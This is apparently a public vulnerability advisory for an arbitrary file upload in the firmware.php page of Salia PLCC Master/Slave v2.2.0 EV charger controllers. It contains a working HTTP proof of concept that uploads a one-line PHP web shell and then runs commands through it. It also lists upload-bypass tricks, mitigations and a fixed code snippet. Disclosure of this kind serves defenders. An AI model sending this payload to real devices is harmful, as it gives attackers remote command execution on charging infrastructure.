# Salia PLCC Master/Slave v2.2.0 has a Arbitrary File Upload Vulnerability

### Description

Salia PLCC Master/Slave v2.2.0 has a Arbitrary File Upload vulnerability in the file /firmware.php ,anyone can upload a file to getshell ,which can lead to **Arbitrary Remote Command Execution**

### Vender

- The latest fireware v2.2.0 download link

  http://salia.echarge.de/firmware/

  http://salia.echarge.de/firmware/firmware_2.2.0.image

![image-20250528104625114](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281046263.png)

### Step

- open the web-ui

![image-20250528103316575](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281033726.png)

- the fireware upload area can upload any file.

![image-20250528103409980](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281034107.png)

### POC

```http
POST /firmware.php HTTP/1.1
Host: XXXX
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="media"; filename="malicious.php"
Content-Type: application/octet-stream

<?php @system($_GET["cmd"]);?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```



Then 

```
http://target.com/uploads/malicious.php?cmd=id
```



![image-20250528104057608](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505281040740.png)



### Analysis

#### Vulnerability Analysis: Arbitrary File Upload in PHP

The vulnerable code in this file is located in the file upload handling section, specifically:

`/firmware.php`

```php
if($_SERVER['REQUEST_METHOD']=='POST'){
    $uploadManager=new \UploadManager\Upload('media');
    $chunks=$uploadManager->upload('uploads');
    if(!empty($chunks)){
        foreach($chunks as $chunk){
            $fw_install = True;
            $update_ready = True;
            $update_filename = $chunk->getNameWithExtension();
        }
    }
}
```



1. **Vulnerability Description**
    The code lacks proper file validation, allowing attackers to upload malicious files (e.g., `.php` scripts) due to:
   - **No file extension/MIME validation** (): The `UploadManager` class processes files without checking extensions or MIME types (e.g., `image/jpeg` vs. `application/x-php`).
   - **No content verification** (): Files like `malicious.php` disguised as `image.jpg` bypass checks by embedding PHP code (e.g., `<?php system($_GET["cmd"]); ?>`).
   - **Unrestricted storage** (): Uploaded files are saved in `/uploads/` without disabling script execution (e.g., missing `.htaccess` rules like `php_flag engine off`).
2. **Proof of Concept (PoC)**
    Attackers exploit this by:
   - **Fake extensions**: Uploading `shell.php.jpg` or using null bytes (`shell.php%00.jpg`) ().
   - **MIME spoofing**: Setting `Content-Type: image/jpeg` for a PHP file ().
   - **Direct execution**: Accessing `http://target.com/uploads/malicious.php?cmd=id` to execute commands ().
3. **Impact**
   - **Remote Code Execution (RCE)**: Full server compromise ().
   - **Data breaches**: Access to sensitive files (e.g., `/etc/passwd`) ().
   - **Persistence**: Uploaded backdoors enable long-term access ().
4. **Mitigation**
   - **Whitelist validation**: Allow only `.bin`, `.zip` for firmware ().
   - **Content checks**: Use `getimagesize()` or file signatures ().
   - **Secure storage**: Store files outside webroot or disable execution ().
   - **Randomize filenames**: Use `uniqid()` to prevent path prediction ().

### Code-Level Fix Example

```php
// Secure file upload snippet
$allowed_ext = ['bin', 'zip'];
$file_ext = strtolower(pathinfo($_FILES['media']['name'], PATHINFO_EXTENSION));
if (!in_array($file_ext, $allowed_ext)) {
    die("Invalid file type.");
}
$new_filename = uniqid() . '.' . $file_ext;
move_uploaded_file($_FILES['media']['tmp_name'], '/secure/storage/' . $new_filename);
```

